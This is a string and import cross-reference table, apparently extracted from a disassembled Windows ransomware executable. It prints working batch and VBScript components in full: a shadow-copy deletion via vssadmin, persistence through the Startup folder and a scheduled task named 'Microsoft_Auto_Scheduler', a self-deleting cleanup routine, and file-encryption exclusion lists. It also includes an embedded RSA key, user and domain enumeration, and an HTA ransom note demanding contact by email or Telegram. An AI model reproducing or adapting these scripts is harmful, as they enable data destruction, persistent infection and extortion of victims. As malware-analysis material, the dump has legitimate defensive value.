reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x405312	0x4e0fa8	string	0x4052c0	', stored '
0x4053a3	0x4e0f90	string	0x4052c0	', trying to retrieve '
0x405570	0x405586	string	0x4052c0	RQ诃\a blocks=Basic Latin,CJK Unified Ideographs
0x405905	0x4e0fd8	string	0x4058e0	Clone() is not implemented yet.
0x4059dc	0x4e0ff8	string	0x4059d0	unknown
0x405ab5	0x4e1004	string	0x405a80	: this object doesn't support resynchronization
0x405b45	0x4e1038	string	0x405b20	StreamTransformation: this object doesn't support random access
0x405ce5	0x4e1078	string	0x405cc0	RandomNumberGenerator: IncorporateEntropy not implemented
0x405d95	0x4e10b4	string	0x405d70	BufferedTransformation: this object is not attachable
0x405ee5	0x4e1120	string	0x405ec0	CryptoMaterial: this object does not support precomputation
0x406065	0x4e1160	string	0x406040	GeneratableCryptoMaterial: this object does not support key/parameter generation
0x4061eb	0x4e11c0	string	0x4061a0	AlgorithmParametersBase: parameter "
0x406247	0x4e11b4	string	0x4061a0	" not used
0x40696a	0x4e11e8	string	0x4068b0	InputBuffer
0x406a0c	0x4e11e8	string	0x4068b0	InputBuffer
0x406d62	0x4e1228	string	0x406d20	CipherModeBase: feedback size cannot be specified for this cipher mode
0x406ec8	0x4e1274	string	0x406e90	/GCM
0x407236	0x4e1210	string	0x407230	EncodingParameters
0x407536	0x4e128c	string	0x4074b0	empty
0x40758a	0x47d2bb	string	0x4074b0	;\r$QP
0x407801	0x4cc018	import	0x4077b0	KERNEL32.dll.SetErrorMode
0x408428	0x47d2bb	string	0x4077b0	;\r$QP
0x408a91	0x4cc018	import	0x408a40	KERNEL32.dll.SetErrorMode
0x40900d	0x4e1298	string	0x408a40	nqpso5938fh71jfu
0x409797	0x47d2bb	string	0x408a40	;\r$QP
0x409811	0x4cc018	import	0x4097c0	KERNEL32.dll.SetErrorMode
0x40a41a	0x47d2bb	string	0x4097c0	;\r$QP
0x40a864	0x4e1298	string	0x40a440	nqpso5938fh71jfu
0x40ade1	0x47d2bb	string	0x40a440	;\r$QP
0x40aeba	0x47d2bb	string	0x40ae10	;\r$QP
0x40af0d	0x47d2bb	string	0x40ae10	;\r$QP
0x40b184	0x4e12f4	string	0x40b0e0	slow
0x40b32d	0x4e1334	string	0x40b0e0	:\Users\
0x40b4a8	0x4e1348	string	0x40b0e0	Desktopini.exe
0x40b642	0x4e1368	string	0x40b0e0	a5m6f
0x40b665	0x4e1368	string	0x40b0e0	a5m6f
0x40b685	0x4e1374	string	0x40b0e0	kaj3n
0x40b86f	0x4e1380	string	0x40b0e0	"%SystemDrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
0x40b899	0x4e1440	string	0x40b0e0	"%SystemDrive%\Users\%username%\Desktop\
0x40b8cf	0x4e1498	string	0x40b0e0	"%SystemDrive%\Documents and Settings\%username%\Desktop\
0x40b8de	0x4e1510	string	0x40b0e0	"%SystemDrive%\Documents and Settings\%username%\Start Menu\Programs\Startup\
0x40b8fc	0x4e1348	string	0x40b0e0	Desktopini.exe
0x40b929	0x4e15ac	string	0x40b0e0	rem a5m6f
0x40b93f	0x4e1374	string	0x40b0e0	kaj3n
0x40ba18	0x4e1cc0	string	0x40b0e0	@echo off\r\ntasklist /v | find /I /c "dcdcf" > nul\r\nif "%ERRORLEVEL%" == "0" goto ErrorAlreadyRunning\r\nset lend=deb\r\nvssadmin.exe Delete Shadows /All /Quiet\r\ntitle dcdcf\r\ngoto notend\r\n:ErrorAlreadyRunning\r\nexit\r\n:secthree\r\ntasklist /fi "ImageName eq
0x40ba2e	0x4e1b68	string	0x40b0e0	" /fo csv 2>NUL | find /I "
0x40bada	0x4e1bf8	string	0x40b0e0	">NUL\r\nif "%ERRORLEVEL%"=="0" goto imer\r\nif %lend% == bed (goto akakak)\r\nset lend=bed\r\nIF EXIST
0x40bb94	0x4e19e0	string	0x40b0e0	Desktopini.exe" (\r\nstart /d
0x40bc3a	0x4e19bc	string	0x40b0e0	" Desktopini.exe
0x40bcf0	0x4e1ba0	string	0x40b0e0	\r\n)\r\n:secttwo\r\ntasklist /fi "ImageName eq
0x40bda0	0x4e1b68	string	0x40b0e0	" /fo csv 2>NUL | find /I "
0x40be50	0x4e1a90	string	0x40b0e0	">NUL\r\nif "%ERRORLEVEL%"=="0" goto notend\r\ngoto secton\r\n:notend\r\ntimeout /t 15 /nobreak >NUL\r\nIF NOT EXIST
0x40bf00	0x4e1a20	string	0x40b0e0	ReadMe_Now!.hta" (\r\ngoto secttwo\r\n:secton\r\nIF EXIST
0x40bfb0	0x4e19e0	string	0x40b0e0	Desktopini.exe" (\r\nstart /d
0x40c064	0x4e19bc	string	0x40b0e0	" Desktopini.exe
0x40c116	0x4e1994	string	0x40b0e0	\r\n)\r\nIF NOT EXIST
0x40c1c6	0x4e1958	string	0x40b0e0	Desktopini.exe" (\r\nIF EXIST "
0x40c544	0x4e18a0	string	0x40b0e0	\r\n)\r\n)\r\ngoto notend\r\n)\r\n:imer\r\ntimeout /t 90 /nobreak >NUL\r\nIF EXIST
0x40c5e4	0x4e1840	string	0x40b0e0	ReadMe_Now!.hta" (\r\ngoto secthree\r\n)\r\n:akakak\r\n
0x40c64f	0x4e15c0	string	0x40b0e0	\r\nschtasks /delete /tn Microsoft_Auto_Scheduler /f\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" (\r\nDEL "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" /f\r\n)\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\t2_svc.bat" (\r\nDEL "%SystemDrive%\Users\%username%\AppData\t2_svc.bat" /f\r\n)\r\nDEL "%~f0" /f
0x40c845	0x4e1334	string	0x40b0e0	:\Users\
0x40c86d	0x4e1eb4	string	0x40b0e0	\AppData\v9_svc.vbs
0x40c8a0	0x4e1ee0	string	0x40b0e0	Dim strScript\r\nDim oExec, oWshShell\r\nDim ComSpec\r\nSet oWshShell = CreateObject("WScript.Shell")\r\nComSpec = oWshShell.ExpandEnvironmentStrings("%comspec%")\r\nstrScript = ComSpec & " /C echo %SystemDrive%\Users\%username%\AppData\h4_svc.bat"\r\nSet oExec = oWshShell.Exec (strScript)\r\nDim outputsxc\r\noutputsxc = oExec.StdOut.ReadAll()\r\nSet fso = CreateObject("Scripting.FileSystemObject")\r\noutputsxc = Replace(outputsxc, vbCr, "")\r\noutputsxc = Replace(outputsxc, vbLf, "")\r\nIf (fso.FileExists(outputsxc)) Then\r\nSet WinScriptHost = CreateObject("WScript.Shell")\r\nWinScriptHost.Run Chr(34) & "%SystemDrive%\Users\%username%\AppData\h4_svc.bat" & Chr(34), 0\r\nSet WinScriptHost = Nothing\r\nEnd If
0x40c8f9	0x4e1334	string	0x40b0e0	:\Users\
0x40c921	0x4e2190	string	0x40b0e0	\AppData\t2_svc.bat
0x40c954	0x4e21b8	string	0x40b0e0	@echo off\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" (\r\nstart "" "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs"\r\n)
0x40c9ad	0x4e2244	string	0x40b0e0	cd "%SystemDrive%\Users\%username%\AppData\"&t2_svc.bat
0x40c9c0	0x4e2280	string	0x40b0e0	schtasks /create /sc minute /mo 6 /tn "Microsoft_Auto_Scheduler" /tr "'C:\Users\%username%\AppData\t2_svc.bat'" /f
0x40caaf	0x47d2bb	string	0x40b0e0	;\r$QP
0x40cccf	0x4cc0ac	import	0x40cc70	KERNEL32.dll.FindFirstFileW
0x40cde4	0x4cc0a4	import	0x40cc70	KERNEL32.dll.FindNextFileW
0x40cf29	0x47d2bb	string	0x40cc70	;\r$QP
0x40cf50	0x4cc024	import	0x40cf40	KERNEL32.dll.GetFileAttributesW
0x40d191	0x40db36	string	0x40cfa0	h4#N
0x40d199	0x4e22f8	string	0x40cfa0	udij=
0x40d3ab	0x4e2318	string	0x40cfa0	d7j3
0x40d3be	0x4e2310	string	0x40cfa0	y9a0
0x40d429	0x4e2308	string	0x40cfa0	m5ha
0x40db36	0x4e2334	string	0x40cfa0	[ID=
0x40e543	0x47d2bb	string	0x40cfa0	;\r$QP
0x40e7c8	0x4e59fc	string	0x40e6e0	_Enc
0x40e7f1	0x4e2334	string	0x40e6e0	[ID=
0x40e874	0x4e5a78	string	0x40e6e0	\Documents and Settings\
0x40e8fb	0x4e5a08	string	0x40e6e0	\Local Settings\Application Data\Microsoft\Credentials
0x40e984	0x40e9d0	string	0x40e6e0	hxZN
0x40e997	0x40e9d0	string	0x40e6e0	hxZN
0x40e9d0	0x4e5a78	string	0x40e6e0	\Documents and Settings\
0x40ea5a	0x4e5ab0	string	0x40e6e0	\Application Data\Microsoft\Credentials
0x40eb10	0x4e5b00	string	0x40e6e0	\Users\All Users\Microsoft\Windows\Caches
0x40eb60	0x40eb90	string	0x40e6e0	hT[N
0x40eb77	0x40eb90	string	0x40e6e0	hT[N
0x40eb90	0x4e5b54	string	0x40e6e0	\ProgramData
0x40ebe0	0x40ec10	string	0x40e6e0	hp[N
0x40ebf7	0x40ec10	string	0x40e6e0	hp[N
0x40ec10	0x4e5b70	string	0x40e6e0	\Recovery
0x40ec90	0x4e5b84	string	0x40e6e0	\ProgramData\Microsoft
0x40ed10	0x4e5bb4	string	0x40e6e0	\Windows
0x40ed60	0x40ed90	string	0x40e6e0	hxZN
0x40ed77	0x40ed90	string	0x40e6e0	hxZN
0x40ed90	0x4e5a78	string	0x40e6e0	\Documents and Settings\
0x40ee1a	0x4e5bc8	string	0x40e6e0	\Local Settings\Temporary Internet Files
0x40eea3	0x40eed0	string	0x40e6e0	hxZN
0x40eeb7	0x40eed0	string	0x40e6e0	hxZN
0x40eed0	0x4e5a78	string	0x40e6e0	\Documents and Settings\
0x40ef5a	0x4e5c1c	string	0x40e6e0	\Start Menu
0x40efdd	0x40f010	string	0x40e6e0	h8\N
0x40eff7	0x40f010	string	0x40e6e0	h8\N
0x40f010	0x4e5c38	string	0x40e6e0	\Documents and Settings\All Users\Start Menu
0x40f090	0x4e5c94	string	0x40e6e0	\WINDOWS
0x40f110	0x4e5ca8	string	0x40e6e0	\Boot
0x40f190	0x4e5cb4	string	0x40e6e0	\$RECYCLE.BIN
0x40f20d	0x4e5cd0	string	0x40e6e0	\System Volume Information
0x40fe31	0x4e5d08	string	0x40e6e0	f__d_d.sys
0x40fe6a	0x4e5d20	string	0x40e6e0	t2_svc.bat
0x40fe9d	0x4e5d38	string	0x40e6e0	v9_svc.vbs
0x40fed0	0x4e5d50	string	0x40e6e0	h4_svc.bat
0x40ff0a	0x4e5d68	string	0x40e6e0	Renc.sys
0x40ff3d	0x4e5d7c	string	0x40e6e0	ReadMe_Now!.hta
0x40ff70	0x4e5d9c	string	0x40e6e0	io.sys
0x40ffaa	0x4e5dac	string	0x40e6e0	ntdetect.com
0x40ffdd	0x4e5dc8	string	0x40e6e0	ntldr
0x410010	0x4e5dd4	string	0x40e6e0	RCRU_64.exe
0x41004a	0x4e5dec	string	0x40e6e0	bootfont.bin
0x41007d	0x4e5e08	string	0x40e6e0	Read_Me!_.txt
0x4100b0	0x4e1348	string	0x40e6e0	Desktopini.exe
0x4100ea	0x4e5e24	string	0x40e6e0	bootmgr
0x41011d	0x4e5e34	string	0x40e6e0	Pagesfilo.sys
0x410150	0x4e5e50	string	0x40e6e0	explorer.exe
0x41018a	0x4e5e6c	string	0x40e6e0	desktop.ini
0x4101ba	0x4e5e84	string	0x40e6e0	BOOTSECT.BAK
0x4101ee	0x4e5ea0	string	0x40e6e0	boot.ini
0x41094e	0x4e5eb8	string	0x40e6e0	memsize
0x410af8	0x4e5ec4	string	0x40e6e0	multiplied_by
0x410b2b	0x4e5ed4	string	0x40e6e0	file_sizer_less_than_memsize
0x410c31	0x4e59fc	string	0x40e6e0	_Enc
0x410c80	0x4e5ef4	string	0x40e6e0	th1024
0x410ce1	0x4e59fc	string	0x40e6e0	_Enc
0x41165d	0x47d2bb	string	0x40e6e0	;\r$QP
0x4117ae	0x4e1334	string	0x411770	:\Users\
0x41199e	0x4e5efc	string	0x411770	AppData\
0x411a27	0x4cc024	import	0x411770	KERNEL32.dll.GetFileAttributesW
0x411a32	0x4cc0b4	import	0x411770	KERNEL32.dll.CreateDirectoryW
0x411a71	0x4cc024	import	0x411770	KERNEL32.dll.GetFileAttributesW
0x411a7f	0x4cc0b4	import	0x411770	KERNEL32.dll.CreateDirectoryW
0x411a8b	0x4cc0b4	import	0x411770	KERNEL32.dll.CreateDirectoryW
0x411a9a	0x4cc0b4	import	0x411770	KERNEL32.dll.CreateDirectoryW
0x411aa1	0x4cc024	import	0x411770	KERNEL32.dll.GetFileAttributesW
0x411c2d	0x47d2bb	string	0x411770	;\r$QP
0x411ca7	0x4cc028	import	0x411c50	KERNEL32.dll.GetSystemDirectoryW
0x411d9c	0x47d2bb	string	0x411c50	;\r$QP
0x411df3	0x4cc00c	import	0x411db0	ADVAPI32.dll.GetUserNameW
0x411f91	0x47d2bb	string	0x411db0	;\r$QP
0x412021	0x4cc02c	import	0x411fa0	KERNEL32.dll.GetComputerNameExW
0x4120c0	0x4cc260	import	0x411fa0	NETAPI32.dll.DsRoleGetPrimaryDomainInformation
0x4120cc	0x4e5f10	string	0x411fa0	Empty
0x412111	0x4e5f10	string	0x411fa0	Empty
0x4125c2	0x47d2bb	string	0x411fa0	;\r$QP
0x41269e	0x4e5f20	string	0x4125e0	MIIBoDANBgkqhkiG9w0BAQEFAAOCAY0AMIIBiAKCAYEAvaM2Ua4pHP8HGmZPaHrRFJomoH2c/4Ysc3XdG9WnWW1K23qOPhyQFHNzG2hUdhLynlwGsqapcC1inwu9cVh+oh5p8PR486FMdXCWUm+WfFNNw0xGWBejd8CIHdBl0eHPT0X3XYGpFLV7xg2NiYe551ff1m4tsYZ9ZQqOEA/GpxXG76BZFPRAuz/ySNbnskKx3gxGuq55vh/qjCFLixUmUnB/tv3lkrdExF7D6ItrKdvuWFrs8B39CdpwvtAfjNJGOiTK2EmvlcRgNBlO+5C4Mz1hGSGCnbBFsW6vL9wZEjg1WM2+qxqfY79dk15OAfgKWD2St/IxUTNNwnZJqlUPyZ+yCwsprxjpFsfNSRXmJpS8pqv81H2rZua6B0e0R4dZnfJq0F0f0FZzZ4FTsobO/w3Ze+BWFr5iY+eaLoXKk8CfUuLNq8SnMrK3SNHDXnY+wLuh0z8qp6w8eUp+nAYUMIYwSdWRX2/LyaGAG7Ar1Khn1ZRP8gv4D7XM7DbGvqqLAgER
0x4129de	0x4e6154	string	0x4125e0	J7x23
0x412c38	0x47d2bb	string	0x4125e0	;\r$QP
0x412c8d	0x4cc054	import	0x412c60	KERNEL32.dll.GlobalMemoryStatusEx
0x412d2d	0x47d2bb	string	0x412c60	;\r$QP
0x412da5	0x4cc264	import	0x412d40	NETAPI32.dll.NetUserEnum
0x412e3f	0x4cc268	import	0x412d40	NETAPI32.dll.NetApiBufferFree
0x412e4f	0x4cc268	import	0x412d40	NETAPI32.dll.NetApiBufferFree
0x412e90	0x47d2bb	string	0x412d40	;\r$QP
0x4139a2	0x47d2bb	string	0x412ea0	;\r$QP
0x413a27	0x4cc28c	import	0x4139e0	USER32.dll.GetWindowTextLengthA
0x413af9	0x4cc284	import	0x4139e0	USER32.dll.GetWindowTextA
0x413de4	0x47d2bb	string	0x4139e0	;\r$QP
0x413ef8	0x4cc278	import	0x413ec0	SHLWAPI.dll.PathIsNetworkPathA
0x413f42	0x4cc030	import	0x413ec0	KERNEL32.dll.MultiByteToWideChar
0x413f63	0x4cc03c	import	0x413ec0	KERNEL32.dll.GetDiskFreeSpaceExW
0x413fb3	0x47d2bb	string	0x413ec0	;\r$QP
0x413fd2	0x47d2bb	string	0x413ec0	;\r$QP
0x41400c	0x4e618c	string	0x413ff0	GetLogicalProcessorInformation
0x414011	0x4e61ac	string	0x413ff0	kernel32
0x41402a	0x4cc0b0	import	0x413ff0	KERNEL32.dll.GetModuleHandleW
0x414031	0x4cc04c	import	0x413ff0	KERNEL32.dll.GetProcAddress
0x41403f	0x4e61c0	string	0x413ff0	\nGetLogicalProcessorInformation is not supported.\n
0x414054	0x47d2bb	string	0x413ff0	;\r$QP
0x41405d	0x4cc034	import	0x413ff0	KERNEL32.dll.GetLastError
0x41409d	0x4e6228	string	0x413ff0	\nError: Allocation failure\n
0x4140b2	0x47d2bb	string	0x413ff0	;\r$QP
0x4140be	0x4e6260	string	0x413ff0	\nError %d\n
0x4140d3	0x47d2bb	string	0x413ff0	;\r$QP
0x4142bb	0x47d2bb	string	0x413ff0	;\r$QP
0x4142fa	0x47d2bb	string	0x413ff0	;\r$QP
0x41432f	0x4cc054	import	0x414310	KERNEL32.dll.GlobalMemoryStatusEx
0x41437f	0x47d2bb	string	0x414310	;\r$QP
0x414393	0x47d2bb	string	0x414310	;\r$QP
0x4143a7	0x47d2bb	string	0x414310	;\r$QP
0x4143bb	0x47d2bb	string	0x414310	;\r$QP
0x4143cf	0x47d2bb	string	0x414310	;\r$QP
0x414453	0x4e6278	string	0x414410	Address:
0x414542	0x47d2bb	string	0x414410	;\r$QP
0x414939	0x4cc018	import	0x414900	KERNEL32.dll.SetErrorMode
0x414a57	0x4e1334	string	0x414900	:\Users\
0x414ac9	0x4e6358	string	0x414900	\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ReadMe_Now!.hta
0x414c91	0x4e1334	string	0x414900	:\Users\
0x414cfd	0x4e63f8	string	0x414900	\Desktop\ReadMe_Now!.hta
0x414f20	0x4e1334	string	0x414900	:\Users\
0x414f83	0x4e6358	string	0x414900	\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ReadMe_Now!.hta
0x415085	0x4cc024	import	0x414900	KERNEL32.dll.GetFileAttributesW
0x4151b0	0x4e1334	string	0x414900	:\Users\
0x41521c	0x4e642c	string	0x414900	\Desktop\
0x41532a	0x4cc024	import	0x414900	KERNEL32.dll.GetFileAttributesW
0x415339	0x4e5d7c	string	0x414900	ReadMe_Now!.hta
0x4154b8	0x4e6440	string	0x414900	:\Documents and Settings\
0x41551b	0x4e642c	string	0x414900	\Desktop\
0x41561d	0x4cc024	import	0x414900	KERNEL32.dll.GetFileAttributesW
0x41562c	0x4e5d7c	string	0x414900	ReadMe_Now!.hta
0x4158a4	0x4e6488	string	0x414900	kharactern4y4&
0x415ac8	0x4cc270	import	0x414900	SHELL32.dll.ShellExecuteW
0x415ace	0x415af1	string	0x414900	h@dN
0x415af1	0x4e6440	string	0x414900	:\Documents and Settings\
0x415b69	0x4e63f8	string	0x414900	\Desktop\ReadMe_Now!.hta
0x415d53	0x415d80	string	0x414900	h@dN
0x415d80	0x4e6440	string	0x414900	:\Documents and Settings\
0x415df8	0x4e6498	string	0x414900	\Start Menu\Programs\Startup\ReadMe_Now!.hta
0x416238	0x47d2bb	string	0x414900	;\r$QP
0x4165ff	0x4cc064	import	0x4165c0	KERNEL32.dll.GetConsoleWindow
0x416608	0x4cc280	import	0x4165c0	USER32.dll.ShowWindow
0x416610	0x4cc018	import	0x4165c0	KERNEL32.dll.SetErrorMode
0x41661b	0x4cc074	import	0x4165c0	KERNEL32.dll.SetConsoleTitleW
0x416637	0x4cc288	import	0x4165c0	USER32.dll.EnumWindows
0x41664a	0x4e64f4	string	0x4165c0	tasklist /v /fo csv | findstr /i "dcdcf"
0x416681	0x4e6520	string	0x4165c0	dcdcf
0x4166a4	0x4e6528	string	0x4165c0	"cmd.exe","
0x416748	0x4e653c	string	0x4165c0	taskkill /PID
0x416a40	0x4e654c	string	0x4165c0	slow
0x416ae0	0x4cc058	import	0x4165c0	KERNEL32.dll.GetModuleFileNameW
0x416b47	0x4e1334	string	0x4165c0	:\Users\
0x416b97	0x4e6558	string	0x4165c0	Version 5.
0x416f41	0x4e656c	string	0x4165c0	nslookup myip.opendns.com. resolver1.opendns.com
0x416f7f	0x4e65ec	string	0x4165c0	Write Us E-mail At :
0x416f92	0x4e65a0	string	0x4165c0	<br><br> Check Your Spam Folder Too.
0x416fcd	0x4e6618	string	0x4165c0	Contact Us In Telegram , ID :
0x416ff6	0x4e1334	string	0x4165c0	:\Users\
0x417028	0x4e6658	string	0x4165c0	\AppData\Pagesfilo.sys
0x41705b	0x4e6688	string	0x4165c0	:\Windows\Pagesfilo.sys
0x41719d	0x4e66b8	string	0x4165c0	n7t0
0x4171ad	0x4e66c0	string	0x4165c0	p2h6
0x41724b	0x4e66c0	string	0x4165c0	p2h6
0x41725e	0x4e66c8	string	0x4165c0	u4g8
0x4172ea	0x4e66c8	string	0x4165c0	u4g8
0x417303	0x4e66d0	string	0x4165c0	h2gq
0x41774e	0x4e66b8	string	0x4165c0	n7t0
0x417767	0x4e66c0	string	0x4165c0	p2h6
0x417849	0x4e66c8	string	0x4165c0	u4g8
0x417886	0x4e66d0	string	0x4165c0	h2gq
0x417992	0x4eb5c8	string	0x4165c0	<!DOCTYPE html><html><head><title>
0x4179a5	0x4e7218	string	0x4165c0	</title><meta content='IE=edge' charset='ISO-8859-1'><HTA:APPLICATION ICON='msiexec.exe' SINGLEINSTANCE='yes' SysMenu='no'><script language='javascript'>window.moveTo(100, 100);window.resizeTo((window.screen.width)-200,(window.screen.height)-200);</script></head><style>.sal{font-size:19px;}.colo{border-radius:25px;color: black;background-color:#eaeceb;padding: 20px;white-space: pre-line;LINE-HEIGHT:20px;}.sel{color:black;background-color:#c4cac6;padding:40px;word-wrap:break-word;margin-bottom:50px;margin-top:60px;border-radius: 25px;LINE-HEIGHT:20px;}.img-container {text-align: center;}</style><body style='background-color:white;'><div class='img-container'><img src='data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4QAiRXhpZgAATU0AKgAAAAgAAQESAAMAAAABAAEAAAAAAAD/4Qm+aHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pg0KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNC40LjAtRXhpdjIiPg0KCTxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+DQoJCTxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+DQoJCQk8ZGM6Y3JlYXRvcj4NCgkJCQk8cmRmOlNlcT4NCgkJCQkJPHJkZjpsaT5WZWN0b3JTdG9jay5jb20vMTE0NDE0NDc8L3JkZjpsaT4NCgkJCQk8L3JkZjpTZXE+DQoJCQk8L2RjOmNyZWF0b3I+DQoJCTwvcmRmOkRlc2NyaXB0aW9uPg0KCTwvcmRmOlJERj4NCjwveDp4bXBtZXRhPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
0x4179d7	0x4e71d8	string	0x4165c0	</br></br>Your Personal ID :
0x417a09	0x4e7108	string	0x4165c0	</br></br>Sent E-mail Should Be Contains Your Personal ID.If Don't Get a Response Or Any Other Problem
